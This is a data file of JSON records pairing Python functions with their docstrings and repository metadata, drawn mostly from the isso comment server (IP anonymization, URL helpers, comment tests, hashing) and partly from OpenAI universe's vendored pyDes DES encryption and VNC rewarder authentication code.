{"docstring": "\"\"\"\nAnonymize IPv4 and IPv6 :param remote_addr: to /24 (zero'd)\nand /48 (zero'd).\n\n\"\"\"\n", "func_signal": "def anonymize(remote_addr):\n", "code": "if not isinstance(remote_addr, str) and isinstance(remote_addr, str):\n    remote_addr = remote_addr.decode('ascii', 'ignore')\ntry:\n    ipv4 = ipaddress.IPv4Address(remote_addr)\n    return u''.join(ipv4.exploded.rsplit('.', 1)[0]) + '.' + '0'\nexcept ipaddress.AddressValueError:\n    try:\n        ipv6 = ipaddress.IPv6Address(remote_addr)\n        if ipv6.ipv4_mapped is not None:\n            return anonymize(str(ipv6.ipv4_mapped))\n        return u'' + ipv6.exploded.rsplit(':', 5)[0] + ':' + ':'.join(['0000'] * 5)\n    except ipaddress.AddressValueError:\n        return u'0.0.0.0'", "path": "isso/isso/utils/__init__.py", "commit_date": "2020-08-08 00:00:00", "repo_name": "isso-comments/isso", "stars": 4945, "license": "mit", "language": "python", "size": 3687}
{"docstring": "# Accept a str on both Python 2 and Python 3, for\n# convenience.\n", "func_signal": "def test_str(self):\n", "code": "examples = [\n    ('12.34.56.78', u'12.34.56.0'),\n    ('1234:5678:90ab:cdef:fedc:ba09:8765:4321',\n     '1234:5678:90ab:0000:0000:0000:0000:0000'),\n    ('::ffff:127.0.0.1', u'127.0.0.0')]\n\nfor (addr, anonymized) in examples:\n    self.assertEqual(utils.anonymize(addr), anonymized)", "path": "isso/isso/tests/test_utils.py", "commit_date": "2018-11-03 00:00:00", "repo_name": "isso-comments/isso", "stars": 4945, "license": "mit", "language": "python", "size": 3687}
{"docstring": "\"\"\"\nBasically the counter-part of :func:`urlsplit`.\n\"\"\"\n\n", "func_signal": "def urljoin(netloc, port, ssl):\n", "code": "rv = (\"https\" if ssl else \"http\") + \"://\" + netloc\nif ssl and port != 443 or not ssl and port != 80:\n    rv += \":%i\" % port\nreturn rv", "path": "isso/isso/wsgi.py", "commit_date": "2020-08-08 00:00:00", "repo_name": "isso-comments/isso", "stars": 4945, "license": "mit", "language": "python", "size": 3687}
{"docstring": "\"\"\"\nParse :param:`name` into (netloc, port, ssl)\n\"\"\"\n\n", "func_signal": "def urlsplit(name):\n", "code": "if not isinstance(name, (str, )):\n    name = str(name)\n\nif not name.startswith(('http://', 'https://')):\n    name = 'http://' + name\n\nrv = urlparse(name)\nif rv.scheme == 'https' and rv.port is None:\n    return rv.netloc, 443, True\nreturn rv.netloc.rsplit(':')[0], rv.port or 80, rv.scheme == 'https'", "path": "isso/isso/wsgi.py", "commit_date": "2020-08-08 00:00:00", "repo_name": "isso-comments/isso", "stars": 4945, "license": "mit", "language": "python", "size": 3687}
{"docstring": "# disable the endpoint\n", "func_signal": "def testLatestNotEnabled(self):\n", "code": "self.conf.set(\"general\", \"latest-enabled\", \"false\")\n\nresponse = self.get('/latest?limit=5')\nself.assertEqual(response.status_code, 404)", "path": "isso/isso/tests/test_comments.py", "commit_date": "2020-08-08 00:00:00", "repo_name": "isso-comments/isso", "stars": 4945, "license": "mit", "language": "python", "size": 3687}
{"docstring": "# load some comments in a mix of posts\n", "func_signal": "def testLatestOk(self):\n", "code": "saved = []\nfor idx, post_id in enumerate([1, 2, 2, 1, 2, 1, 3, 1, 4, 2, 3, 4, 1, 2]):\n    text = 'text-{}'.format(idx)\n    post_uri = 'test-{}'.format(post_id)\n    self.post('/new?uri=' + post_uri, data=json.dumps({'text': text}))\n    saved.append((post_uri, text))\n\nresponse = self.get('/latest?limit=5')\nself.assertEqual(response.status_code, 200)\n\nbody = loads(response.data)\nexpected_items = saved[-5:]  # latest 5\nfor reply, expected in zip(body, expected_items):\n    expected_uri, expected_text = expected\n    self.assertIn(expected_text, reply['text'])\n    self.assertEqual(expected_uri, reply['uri'])", "path": "isso/isso/tests/test_comments.py", "commit_date": "2020-08-08 00:00:00", "repo_name": "isso-comments/isso", "stars": 4945, "license": "mit", "language": "python", "size": 3687}
{"docstring": "\"\"\"\nDecorator to execute each :param func: call in a separate thread.\n\"\"\"\n\n", "func_signal": "def threaded(func):\n", "code": "def dec(self, *args, **kwargs):\n    thread.start_new_thread(func, (self, ) + args, kwargs)\n\nreturn dec", "path": "isso/isso/core.py", "commit_date": "2020-08-08 00:00:00", "repo_name": "isso-comments/isso", "stars": 4945, "license": "mit", "language": "python", "size": 3687}
{"docstring": "\"\"\"Calculate hash from value (must be bytes).\"\"\"\n\n", "func_signal": "def hash(self, val):\n", "code": "if not isinstance(val, bytes):\n    raise _TypeError(\"val\", \"bytes\", val)\n\nrv = self.compute(val)\n\nif not isinstance(val, bytes):\n    raise _TypeError(\"val\", \"bytes\", rv)\n\nreturn rv", "path": "isso/isso/utils/hash.py", "commit_date": "2020-08-08 00:00:00", "repo_name": "isso-comments/isso", "stars": 4945, "license": "mit", "language": "python", "size": 3687}
{"docstring": "\"\"\"Return the anonymized IP address of the requester.\n\nTakes into consideration a potential X-Forwarded-For HTTP header\nif a necessary server.trusted-proxies configuration entry is set.\n\nRecipe source: https://stackoverflow.com/a/22936947/636849\n\"\"\"\n", "func_signal": "def _remote_addr(self, request):\n", "code": "remote_addr = request.remote_addr\nif self.trusted_proxies:\n    route = request.access_route + [remote_addr]\n    remote_addr = next((addr for addr in reversed(route)\n                        if addr not in self.trusted_proxies), remote_addr)\nreturn utils.anonymize(str(remote_addr))", "path": "isso/isso/views/comments.py", "commit_date": "2020-08-08 00:00:00", "repo_name": "isso-comments/isso", "stars": 4945, "license": "mit", "language": "python", "size": 3687}
{"docstring": "\"\"\"\n[ comment 1 ]\n    |\n    --- [ comment 2, ref 1 ]\n    |\n    --- [ comment 3, ref 1 ]\n[ comment 4 ]\n\"\"\"\n", "func_signal": "def testDeleteWithMultipleReferences(self):\n", "code": "client = JSONClient(self.app, Response)\n\nclient.post('/new?uri=%2Fpath%2F', data=json.dumps({'text': 'First'}))\nclient.post('/new?uri=%2Fpath%2F',\n            data=json.dumps({'text': 'Second', 'parent': 1}))\nclient.post('/new?uri=%2Fpath%2F',\n            data=json.dumps({'text': 'Third', 'parent': 1}))\nclient.post('/new?uri=%2Fpath%2F', data=json.dumps({'text': 'Last'}))\n\nclient.delete('/id/1')\nself.assertEqual(self.get('/?uri=%2Fpath%2F').status_code, 200)\nclient.delete('/id/2')\nself.assertEqual(self.get('/?uri=%2Fpath%2F').status_code, 200)\nclient.delete('/id/3')\nself.assertEqual(self.get('/?uri=%2Fpath%2F').status_code, 200)\nclient.delete('/id/4')\nself.assertEqual(self.get('/?uri=%2Fpath%2F').status_code, 200)\n\ndata = loads(client.get('/?uri=%2Fpath%2F').data)\nself.assertEqual(len(data['replies']), 0)", "path": "isso/isso/tests/test_comments.py", "commit_date": "2020-08-08 00:00:00", "repo_name": "isso-comments/isso", "stars": 4945, "license": "mit", "language": "python", "size": 3687}
{"docstring": "\"\"\"\nParse :param string: into :class:`datetime.timedelta`, you can use any\n(logical) combination of Nw, Nd, Nh and Nm, e.g. `1h30m` for 1 hour, 30\nminutes or `3w` for 3 weeks.\n\nRaises a ValueError if the input is invalid/unparseable.\n\n>>> print(timedelta(\"3w\"))\n21 days, 0:00:00\n>>> print(timedelta(\"3w 12h 57m\"))\n21 days, 12:57:00\n>>> print(timedelta(\"1h30m37s\"))\n1:30:37\n>>> print(timedelta(\"1asdf3w\"))\nTraceback (most recent call last):\n    ...\nValueError: invalid human-readable timedelta\n\"\"\"\n\n", "func_signal": "def timedelta(string):\n", "code": "keys = [\"weeks\", \"days\", \"hours\", \"minutes\", \"seconds\"]\nregex = \"\".join([\"((?P<%s>\\\\d+)%s ?)?\" % (k, k[0]) for k in keys])\nkwargs = {}\nfor k, v in re.match(regex, string).groupdict(default=\"0\").items():\n    kwargs[k] = int(v)\n\nrv = datetime.timedelta(**kwargs)\nif rv == datetime.timedelta():\n    raise ValueError(\"invalid human-readable timedelta\")\n\nreturn datetime.timedelta(**kwargs)", "path": "isso/isso/config.py", "commit_date": "2020-08-08 00:00:00", "repo_name": "isso-comments/isso", "stars": 4945, "license": "mit", "language": "python", "size": 3687}
{"docstring": "\"\"\"Process the input file and fill the DB.\"\"\"\n", "func_signal": "def migrate(self):\n", "code": "with io.open(self.json_file, 'rt', encoding='utf8') as fh:\n    threads = json.load(fh)\nprogress = Progress(len(threads))\n\nfor i, thread in enumerate(threads):\n    progress.update(i, str(i))\n    self.insert(thread)\n\nprogress.finish(\"{0} threads, {1} comments\".format(len(threads), self.count))", "path": "isso/isso/migrate.py", "commit_date": "2020-08-08 00:00:00", "repo_name": "isso-comments/isso", "stars": 4945, "license": "mit", "language": "python", "size": 3687}
{"docstring": "\"\"\"Calculate hash from unicode value and return hex value as unicode\"\"\"\n\n", "func_signal": "def uhash(self, val):\n", "code": "if not isinstance(val, (str, )):\n    raise _TypeError(\"val\", \"str\", val)\n\nreturn codecs.encode(self.hash(val.encode(\"utf-8\")), \"hex_codec\").decode(\"utf-8\")", "path": "isso/isso/utils/hash.py", "commit_date": "2020-08-08 00:00:00", "repo_name": "isso-comments/isso", "stars": 4945, "license": "mit", "language": "python", "size": 3687}
{"docstring": "\"\"\"Transform previously A -> B -> C comment nesting to A -> B, A -> C\"\"\"\n\n", "func_signal": "def test_limit_nested_comments(self):\n", "code": "tree = {\n    1: None,\n    2: None,\n    3: 2,\n    4: 3,\n    7: 3,\n    5: 2,\n    6: None\n}\n\nwith sqlite3.connect(self.path) as con:\n    con.execute(\"PRAGMA user_version = 2\")\n    con.execute(\"CREATE TABLE threads (\"\n                \"    id INTEGER PRIMARY KEY,\"\n                \"    uri VARCHAR UNIQUE,\"\n                \"    title VARCHAR)\")\n    con.execute(\"CREATE TABLE comments (\"\n                \"    tid REFERENCES threads(id),\"\n                \"    id INTEGER PRIMARY KEY,\"\n                \"    parent INTEGER,\"\n                \"    created FLOAT NOT NULL, modified FLOAT,\"\n                \"    text VARCHAR, email VARCHAR, website VARCHAR,\"\n                \"    mode INTEGER,\"\n                \"    remote_addr VARCHAR,\"\n                \"    likes INTEGER DEFAULT 0,\"\n                \"    dislikes INTEGER DEFAULT 0,\"\n                \"    voters BLOB)\")\n\n    con.execute(\n        \"INSERT INTO threads (uri, title) VALUES (?, ?)\", (\"/\", \"Test\"))\n    for (id, parent) in tree.items():\n        con.execute(\"INSERT INTO comments (\"\n                    \"   id, parent, created)\"\n                    \"VALUEs (?, ?, ?)\", (id, parent, id))\n\nconf = config.new({\n    \"general\": {\n        \"dbpath\": \"/dev/null\",\n        \"max-age\": \"1h\"\n    }\n})\nSQLite3(self.path, conf)\n\nflattened = list({\n    1: None,\n    2: None,\n    3: 2,\n    4: 2,\n    5: 2,\n    6: None,\n    7: 2\n}.items())\n\nwith sqlite3.connect(self.path) as con:\n    rv = con.execute(\n        \"SELECT id, parent FROM comments ORDER BY created\").fetchall()\n    self.assertEqual(flattened, rv)", "path": "isso/isso/tests/test_db.py", "commit_date": "2020-08-08 00:00:00", "repo_name": "isso-comments/isso", "stars": 4945, "license": "mit", "language": "python", "size": 3687}
{"docstring": "\"\"\"\nExtract <h1> title from web page. The title is *probably* the text node,\nwhich is the nearest H1 node in context to an element with the `isso-thread` id.\n\"\"\"\n\n", "func_signal": "def thread(data, default=u\"Untitled.\", id=None):\n", "code": "html = html5lib.parse(data, treebuilder=\"dom\")\n\nassert html.lastChild.nodeName == \"html\"\nhtml = html.lastChild\n\n# aka getElementById, but limited to div and section tags\nel = list(filter(lambda i: i.attributes[\"id\"].value == \"isso-thread\",\n                 filter(lambda i: \"id\" in i.attributes,\n                        chain(*map(html.getElementsByTagName, (\"div\", \"section\"))))))\n\nif not el:\n    return id, default\n\nel = el[0]\nvisited = []\n\ndef recurse(node):\n    for child in node.childNodes:\n        if child.nodeType != child.ELEMENT_NODE:\n            continue\n        if child.nodeName.upper() == \"H1\":\n            return child\n        if child not in visited:\n            return recurse(child)\n\ndef gettext(rv):\n    for child in rv.childNodes:\n        if child.nodeType == child.TEXT_NODE:\n            yield child.nodeValue\n        if child.nodeType == child.ELEMENT_NODE:\n            for item in gettext(child):\n                yield item\n\ntry:\n    id = unquote(el.attributes[\"data-isso-id\"].value)\nexcept (KeyError, AttributeError):\n    pass\n\ntry:\n    return id, unquote(el.attributes[\"data-title\"].value)\nexcept (KeyError, AttributeError):\n    pass\n\nwhile el is not None:  # el.parentNode is None in the very end\n\n    visited.append(el)\n    rv = recurse(el)\n\n    if rv:\n        return id, ''.join(gettext(rv)).strip()\n\n    el = el.parentNode\n\nreturn id, default", "path": "isso/isso/utils/parse.py", "commit_date": "2020-08-08 00:00:00", "repo_name": "isso-comments/isso", "stars": 4945, "license": "mit", "language": "python", "size": 3687}
{"docstring": "\"\"\"\nReturn a function that returns a valid HTTP Origin or localhost\nif none found.\n\"\"\"\n\n", "func_signal": "def origin(hosts):\n", "code": "hosts = [urlsplit(h) for h in hosts]\n\ndef func(environ):\n    if 'ISSO_CORS_ORIGIN' in environ:\n        return environ['ISSO_CORS_ORIGIN']\n\n    if not hosts:\n        return \"http://invalid.local\"\n\n    loc = environ.get(\"HTTP_ORIGIN\", environ.get(\"HTTP_REFERER\", None))\n\n    if loc is None:\n        return urljoin(*hosts[0])\n\n    for split in hosts:\n        if urlsplit(loc) == split:\n            return urljoin(*split)\n    else:\n        return urljoin(*hosts[0])\n\nreturn func", "path": "isso/isso/wsgi.py", "commit_date": "2020-08-08 00:00:00", "repo_name": "isso-comments/isso", "stars": 4945, "license": "mit", "language": "python", "size": 3687}
{"docstring": "\"\"\"Factory to create hash functions from configuration section. If an\nalgorithm takes custom parameters, you can separate them by a colon like\nthis: pbkdf2:arg1:arg2:arg3.\"\"\"\n\n", "func_signal": "def new(conf):\n", "code": "algorithm = conf.get(\"algorithm\")\nsalt = conf.get(\"salt\").encode(\"utf-8\")\n\nif algorithm == \"none\":\n    return Hash(salt, None)\nelif algorithm.startswith(\"pbkdf2\"):\n    kwargs = {}\n    tail = algorithm.partition(\":\")[2]\n    for func, key in ((int, \"iterations\"), (int, \"dklen\"), (str, \"func\")):\n        head, _, tail = tail.partition(\":\")\n        if not head:\n            break\n        kwargs[key] = func(head)\n\n    return PBKDF2(salt, **kwargs)\nelse:\n    return Hash(salt, algorithm)", "path": "isso/isso/utils/hash.py", "commit_date": "2020-08-08 00:00:00", "repo_name": "isso-comments/isso", "stars": 4945, "license": "mit", "language": "python", "size": 3687}
{"docstring": "# attributes found in Sundown's HTML serializer [1]\n# except for <img> tag,\n# because images are not generated anyways.\n#\n# [1] https://github.com/vmg/sundown/blob/master/html/html.c\n", "func_signal": "def __init__(self, elements, attributes):\n", "code": "self.elements = [\"a\", \"p\", \"hr\", \"br\", \"ol\", \"ul\", \"li\",\n                 \"pre\", \"code\", \"blockquote\",\n                 \"del\", \"ins\", \"strong\", \"em\",\n                 \"h1\", \"h2\", \"h3\", \"h4\", \"h5\", \"h6\",\n                 \"table\", \"thead\", \"tbody\", \"th\", \"td\"] + elements\n\n# href for <a> and align for <table>\nself.attributes = [\"align\", \"href\"] + attributes", "path": "isso/isso/utils/html.py", "commit_date": "2020-10-10 00:00:00", "repo_name": "isso-comments/isso", "stars": 4945, "license": "mit", "language": "python", "size": 3687}
{"docstring": "# if the feature is not allowed, don't present the endpoint\n", "func_signal": "def latest(self, environ, request):\n", "code": "if not self.conf.getboolean(\"latest-enabled\"):\n    return NotFound()\n\n# get and check the limit\nbad_limit_msg = \"Query parameter 'limit' is mandatory (integer, >0)\"\ntry:\n    limit = int(request.args['limit'])\nexcept (KeyError, ValueError):\n    return BadRequest(bad_limit_msg)\nif limit <= 0:\n    return BadRequest(bad_limit_msg)\n\n# retrieve the latest N comments from the DB\nall_comments_gen = self.comments.fetchall(limit=None, order_by='created', mode='1')\ncomments = collections.deque(all_comments_gen, maxlen=limit)\n\n# prepare a special set of fields (except text which is rendered specifically)\nfields = {\n    'author',\n    'created',\n    'dislikes',\n    'id',\n    'likes',\n    'mode',\n    'modified',\n    'parent',\n    'text',\n    'uri',\n    'website',\n}\n\n# process the retrieved comments and build results\nresult = []\nfor comment in comments:\n    processed = {key: comment[key] for key in fields}\n    processed['text'] = self.isso.render(comment['text'])\n    result.append(processed)\n\nreturn JSON(result, 200)", "path": "isso/isso/views/comments.py", "commit_date": "2020-08-08 00:00:00", "repo_name": "isso-comments/isso", "stars": 4945, "license": "mit", "language": "python", "size": 3687}
{"docstring": "\"\"\"Sets the type of padding mode, pyDes.PAD_NORMAL or pyDes.PAD_PKCS5\"\"\"\n", "func_signal": "def setPadMode(self, mode):\n", "code": "_baseDes.setPadMode(self, mode)\nfor key in (self.__key1, self.__key2, self.__key3):\n\tkey.setPadMode(mode)", "path": "universe/universe/vncdriver/vendor/pydes.py", "commit_date": "2016-12-05 00:00:00", "repo_name": "openai/universe", "stars": 7430, "license": "mit", "language": "python", "size": 1616}
{"docstring": "\"\"\"encrypt(data, [pad], [padmode]) -> bytes\n\ndata : Bytes to be encrypted\npad  : Optional argument for encryption padding. Must only be one byte\npadmode : Optional argument for overriding the padding mode.\n\nThe data must be a multiple of 8 bytes and will be encrypted\nwith the already specified key. Data does not have to be a\nmultiple of 8 bytes if the padding character is supplied, or\nthe padmode is set to PAD_PKCS5, as bytes will then added to\nensure the be padded data is a multiple of 8 bytes.\n\"\"\"\n", "func_signal": "def encrypt(self, data, pad=None, padmode=None):\n", "code": "data = self._guardAgainstUnicode(data)\nif pad is not None:\n\tpad = self._guardAgainstUnicode(pad)\ndata = self._padData(data, pad, padmode)\nreturn self.crypt(data, des.ENCRYPT)", "path": "universe/universe/vncdriver/vendor/pydes.py", "commit_date": "2016-12-05 00:00:00", "repo_name": "openai/universe", "stars": 7430, "license": "mit", "language": "python", "size": 1616}
{"docstring": "# Ugly, but it'll have to do for now.\n", "func_signal": "def authenticate(self, request):\n", "code": "authorization = request.headers.get('authorization')\nif authorization is None:\n    logger.info('REJECT REASON: No authorization header supplied: %s', request.headers)\n    self.reject('No authorization header supplied. You must supply a basic authentication header.')\n    return\nbasic = utils.basic_auth_decode(authorization)\nif basic is None:\n    logger.info('REJECT REASON: Invalid basic auth header: %s', request.headers)\n    self.reject('Could not parse authorization header. You must supply a basic authentication header.')\n    return\nusername, password = basic\nif username != self.password:\n    logger.info('REJECT REASON: Invalid password: %r (%s expected; %s)', username, self.password, request.headers)\n    self.reject('Invalid password: {!r}. If you are using the allocator, you should see your password in the logs; if spinning up an environment by hand, it defaults to \"openai\". Connect as vnc://<ip>:<port>?password=<password>.'.format(username))\n    return", "path": "universe/universe/rewarder/remote.py", "commit_date": "2016-12-13 00:00:00", "repo_name": "openai/universe", "stars": 7430, "license": "mit", "language": "python", "size": 1616}
{"docstring": "\"\"\"Crypt the data in blocks, running it through des_crypt()\"\"\"\n\n# Error check the data\n", "func_signal": "def crypt(self, data, crypt_type):\n", "code": "if not data:\n\treturn ''\nif len(data) % self.block_size != 0:\n\tif crypt_type == des.DECRYPT: # Decryption must work on 8 byte blocks\n\t\traise ValueError(\"Invalid data length, data must be a multiple of \" + str(self.block_size) + \" bytes\\n.\")\n\tif not self.getPadding():\n\t\traise ValueError(\"Invalid data length, data must be a multiple of \" + str(self.block_size) + \" bytes\\n. Try setting the optional padding character\")\n\telse:\n\t\tdata += (self.block_size - (len(data) % self.block_size)) * self.getPadding()\n\t# print \"Len of data: %f\" % (len(data) / self.block_size)\n\nif self.getMode() == CBC:\n\tif self.getIV():\n\t\tiv = self.__String_to_BitList(self.getIV())\n\telse:\n\t\traise ValueError(\"For CBC mode, you must supply the Initial Value (IV) for ciphering\")\n\n# Split the data into blocks, crypting each one seperately\ni = 0\ndict = {}\nresult = []\n#cached = 0\n#lines = 0\nwhile i < len(data):\n\t# Test code for caching encryption results\n\t#lines += 1\n\t#if dict.has_key(data[i:i+8]):\n\t\t#print \"Cached result for: %s\" % data[i:i+8]\n\t#\tcached += 1\n\t#\tresult.append(dict[data[i:i+8]])\n\t#\ti += 8\n\t#\tcontinue\n\n\tblock = self.__String_to_BitList(data[i:i+8])\n\n\t# Xor with IV if using CBC mode\n\tif self.getMode() == CBC:\n\t\tif crypt_type == des.ENCRYPT:\n\t\t\tblock = list(map(lambda x, y: x ^ y, block, iv))\n\t\t\t#j = 0\n\t\t\t#while j < len(block):\n\t\t\t#\tblock[j] = block[j] ^ iv[j]\n\t\t\t#\tj += 1\n\n\t\tprocessed_block = self.__des_crypt(block, crypt_type)\n\n\t\tif crypt_type == des.DECRYPT:\n\t\t\tprocessed_block = list(map(lambda x, y: x ^ y, processed_block, iv))\n\t\t\t#j = 0\n\t\t\t#while j < len(processed_block):\n\t\t\t#\tprocessed_block[j] = processed_block[j] ^ iv[j]\n\t\t\t#\tj += 1\n\t\t\tiv = block\n\t\telse:\n\t\t\tiv = processed_block\n\telse:\n\t\tprocessed_block = self.__des_crypt(block, crypt_type)\n\n\n\t# Add the resulting crypted block to our list\n\t#d = self.__BitList_to_String(processed_block)\n\t#result.append(d)\n\tresult.append(self.__BitList_to_String(processed_block))\n\t#dict[data[i:i+8]] = d\n\ti += 8\n\n# print \"Lines: %d, cached: %d\" % (lines, cached)\n\n# Return the full crypted string\nif _pythonMajorVersion < 3:\n\treturn ''.join(result)\nelse:\n\treturn bytes.fromhex('').join(result)", "path": "universe/universe/vncdriver/vendor/pydes.py", "commit_date": "2016-12-05 00:00:00", "repo_name": "openai/universe", "stars": 7430, "license": "mit", "language": "python", "size": 1616}
{"docstring": "# Pad data depending on the mode\n", "func_signal": "def _padData(self, data, pad, padmode):\n", "code": "if padmode is None:\n\t# Get the default padding mode.\n\tpadmode = self.getPadMode()\nif pad and padmode == PAD_PKCS5:\n\traise ValueError(\"Cannot use a pad character with PAD_PKCS5\")\n\nif padmode == PAD_NORMAL:\n\tif len(data) % self.block_size == 0:\n\t\t# No padding required.\n\t\treturn data\n\n\tif not pad:\n\t\t# Get the default padding.\n\t\tpad = self.getPadding()\n\tif not pad:\n\t\traise ValueError(\"Data must be a multiple of \" + str(self.block_size) + \" bytes in length. Use padmode=PAD_PKCS5 or set the pad character.\")\n\tdata += (self.block_size - (len(data) % self.block_size)) * pad\n\nelif padmode == PAD_PKCS5:\n\tpad_len = 8 - (len(data) % self.block_size)\n\tif _pythonMajorVersion < 3:\n\t\tdata += pad_len * chr(pad_len)\n\telse:\n\t\tdata += bytes([pad_len] * pad_len)\n\nreturn data", "path": "universe/universe/vncdriver/vendor/pydes.py", "commit_date": "2016-12-05 00:00:00", "repo_name": "openai/universe", "stars": 7430, "license": "mit", "language": "python", "size": 1616}
{"docstring": "\"\"\"setPadding() -> bytes of length 1. Padding character.\"\"\"\n", "func_signal": "def setPadding(self, pad):\n", "code": "_baseDes.setPadding(self, pad)\nfor key in (self.__key1, self.__key2, self.__key3):\n\tkey.setPadding(pad)", "path": "universe/universe/vncdriver/vendor/pydes.py", "commit_date": "2016-12-05 00:00:00", "repo_name": "openai/universe", "stars": 7430, "license": "mit", "language": "python", "size": 1616}
{"docstring": "\"\"\"Sets the type of crypting mode, pyDes.ECB or pyDes.CBC\"\"\"\n", "func_signal": "def setMode(self, mode):\n", "code": "_baseDes.setMode(self, mode)\nfor key in (self.__key1, self.__key2, self.__key3):\n\tkey.setMode(mode)", "path": "universe/universe/vncdriver/vendor/pydes.py", "commit_date": "2016-12-05 00:00:00", "repo_name": "openai/universe", "stars": 7430, "license": "mit", "language": "python", "size": 1616}
{"docstring": "\"\"\"Will set the Initial Value, used in conjunction with CBC mode\"\"\"\n", "func_signal": "def setIV(self, IV):\n", "code": "_baseDes.setIV(self, IV)\nfor key in (self.__key1, self.__key2, self.__key3):\n\tkey.setIV(IV)", "path": "universe/universe/vncdriver/vendor/pydes.py", "commit_date": "2016-12-05 00:00:00", "repo_name": "openai/universe", "stars": 7430, "license": "mit", "language": "python", "size": 1616}
{"docstring": "\"\"\"decrypt(data, [pad], [padmode]) -> bytes\n\ndata : bytes to be encrypted\npad  : Optional argument for decryption padding. Must only be one byte\npadmode : Optional argument for overriding the padding mode.\n\nThe data must be a multiple of 8 bytes and will be decrypted\nwith the already specified key. In PAD_NORMAL mode, if the\noptional padding character is supplied, then the un-encrypted\ndata will have the padding characters removed from the end of\nthe bytes. This pad removal only occurs on the last 8 bytes of\nthe data (last data block). In PAD_PKCS5 mode, the special\npadding end markers will be removed from the data after\ndecrypting, no pad character is required for PAD_PKCS5.\n\"\"\"\n", "func_signal": "def decrypt(self, data, pad=None, padmode=None):\n", "code": "ENCRYPT = des.ENCRYPT\nDECRYPT = des.DECRYPT\ndata = self._guardAgainstUnicode(data)\nif pad is not None:\n\tpad = self._guardAgainstUnicode(pad)\nif self.getMode() == CBC:\n\tself.__key1.setIV(self.getIV())\n\tself.__key2.setIV(self.getIV())\n\tself.__key3.setIV(self.getIV())\n\ti = 0\n\tresult = []\n\twhile i < len(data):\n\t\tiv = data[i:i+8]\n\t\tblock = self.__key3.crypt(iv,    DECRYPT)\n\t\tblock = self.__key2.crypt(block, ENCRYPT)\n\t\tblock = self.__key1.crypt(block, DECRYPT)\n\t\tself.__key1.setIV(iv)\n\t\tself.__key2.setIV(iv)\n\t\tself.__key3.setIV(iv)\n\t\tresult.append(block)\n\t\ti += 8\n\tif _pythonMajorVersion < 3:\n\t\tdata = ''.join(result)\n\telse:\n\t\tdata = bytes.fromhex('').join(result)\nelse:\n\tdata = self.__key3.crypt(data, DECRYPT)\n\tdata = self.__key2.crypt(data, ENCRYPT)\n\tdata = self.__key1.crypt(data, DECRYPT)\nreturn self._unpadData(data, pad, padmode)", "path": "universe/universe/vncdriver/vendor/pydes.py", "commit_date": "2016-12-05 00:00:00", "repo_name": "openai/universe", "stars": 7430, "license": "mit", "language": "python", "size": 1616}
{"docstring": "\"\"\"Will set the crypting key for this object. Either 16 or 24 bytes long.\"\"\"\n", "func_signal": "def setKey(self, key):\n", "code": "self.key_size = 24  # Use DES-EDE3 mode\nif len(key) != self.key_size:\n\tif len(key) == 16: # Use DES-EDE2 mode\n\t\tself.key_size = 16\n\telse:\n\t\traise ValueError(\"Invalid triple DES key size. Key must be either 16 or 24 bytes long\")\nif self.getMode() == CBC:\n\tif not self.getIV():\n\t\t# Use the first 8 bytes of the key\n\t\tself._iv = key[:self.block_size]\n\tif len(self.getIV()) != self.block_size:\n\t\traise ValueError(\"Invalid IV, must be 8 bytes in length\")\nself.__key1 = des(key[:8], self._mode, self._iv,\n\t\t  self._padding, self._padmode)\nself.__key2 = des(key[8:16], self._mode, self._iv,\n\t\t  self._padding, self._padmode)\nif self.key_size == 16:\n\tself.__key3 = self.__key1\nelse:\n\tself.__key3 = des(key[16:], self._mode, self._iv,\n\t\t\t  self._padding, self._padmode)\n_baseDes.setKey(self, key)", "path": "universe/universe/vncdriver/vendor/pydes.py", "commit_date": "2016-12-05 00:00:00", "repo_name": "openai/universe", "stars": 7430, "license": "mit", "language": "python", "size": 1616}
{"docstring": "\"\"\"Crypt the block of data through DES bit-manipulation\"\"\"\n", "func_signal": "def __des_crypt(self, block, crypt_type):\n", "code": "block = self.__permutate(des.__ip, block)\nself.L = block[:32]\nself.R = block[32:]\n\n# Encryption starts from Kn[1] through to Kn[16]\nif crypt_type == des.ENCRYPT:\n\titeration = 0\n\titeration_adjustment = 1\n# Decryption starts from Kn[16] down to Kn[1]\nelse:\n\titeration = 15\n\titeration_adjustment = -1\n\ni = 0\nwhile i < 16:\n\t# Make a copy of R[i-1], this will later become L[i]\n\ttempR = self.R[:]\n\n\t# Permutate R[i - 1] to start creating R[i]\n\tself.R = self.__permutate(des.__expansion_table, self.R)\n\n\t# Exclusive or R[i - 1] with K[i], create B[1] to B[8] whilst here\n\tself.R = list(map(lambda x, y: x ^ y, self.R, self.Kn[iteration]))\n\tB = [self.R[:6], self.R[6:12], self.R[12:18], self.R[18:24], self.R[24:30], self.R[30:36], self.R[36:42], self.R[42:]]\n\t# Optimization: Replaced below commented code with above\n\t#j = 0\n\t#B = []\n\t#while j < len(self.R):\n\t#\tself.R[j] = self.R[j] ^ self.Kn[iteration][j]\n\t#\tj += 1\n\t#\tif j % 6 == 0:\n\t#\t\tB.append(self.R[j-6:j])\n\n\t# Permutate B[1] to B[8] using the S-Boxes\n\tj = 0\n\tBn = [0] * 32\n\tpos = 0\n\twhile j < 8:\n\t\t# Work out the offsets\n\t\tm = (B[j][0] << 1) + B[j][5]\n\t\tn = (B[j][1] << 3) + (B[j][2] << 2) + (B[j][3] << 1) + B[j][4]\n\n\t\t# Find the permutation value\n\t\tv = des.__sbox[j][(m << 4) + n]\n\n\t\t# Turn value into bits, add it to result: Bn\n\t\tBn[pos] = (v & 8) >> 3\n\t\tBn[pos + 1] = (v & 4) >> 2\n\t\tBn[pos + 2] = (v & 2) >> 1\n\t\tBn[pos + 3] = v & 1\n\n\t\tpos += 4\n\t\tj += 1\n\n\t# Permutate the concatination of B[1] to B[8] (Bn)\n\tself.R = self.__permutate(des.__p, Bn)\n\n\t# Xor with L[i - 1]\n\tself.R = list(map(lambda x, y: x ^ y, self.R, self.L))\n\t# Optimization: This now replaces the below commented code\n\t#j = 0\n\t#while j < len(self.R):\n\t#\tself.R[j] = self.R[j] ^ self.L[j]\n\t#\tj += 1\n\n\t# L[i] becomes R[i - 1]\n\tself.L = tempR\n\n\ti += 1\n\titeration += iteration_adjustment\n\n# Final permutation of R[16]L[16]\nself.final = self.__permutate(des.__fp, self.R + self.L)\nreturn self.final", "path": "universe/universe/vncdriver/vendor/pydes.py", "commit_date": "2016-12-05 00:00:00", "repo_name": "openai/universe", "stars": 7430, "license": "mit", "language": "python", "size": 1616}
